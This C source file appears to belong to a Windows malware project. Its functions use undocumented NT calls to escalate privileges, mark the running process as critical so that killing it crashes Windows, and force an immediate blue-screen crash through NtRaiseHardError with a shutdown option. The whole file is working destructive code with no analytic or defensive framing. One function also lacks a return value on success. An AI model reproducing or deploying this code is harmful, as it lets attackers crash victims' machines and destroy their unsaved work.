#include "../../HeaderFiles/N0TiLLerka.h"

#ifndef DISABLE_NT_FUNCTIONS
BOOL fnNTSetProcessIsCritical(
	_In_ BOOLEAN blIsCritical
) {
	BOOLEAN bl;
	if (!RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bl)) {
		if (!RtlSetProcessIsCritical(blIsCritical, NULL, FALSE)) {
			return TRUE;
		} else {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Couldn't set Process Critical", L"RtlSetProcessIsCritical", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			return FALSE;
		}
	} else {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Couldn't set Debug Privileges", L"RtlAdjustPrivilege", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
		return FALSE;
	}
}

BOOL fnNTRaiseHardError(VOID) {
	BOOLEAN bl;
	if (!RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bl)) {
		UINT u;
		if (NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, NULL, NULL, OPTION_SHUTDOWN_SYSTEM, &u)) {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Failed to raise HardError", L"NtRaiseHardError", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			return FALSE;
		}
	} else {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Couldn't set Shutdwon Privileges", L"RtlAdjustPrivilege", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
		return FALSE;
	}
}
#endif // !DISABLE_NT_FUNCTIONS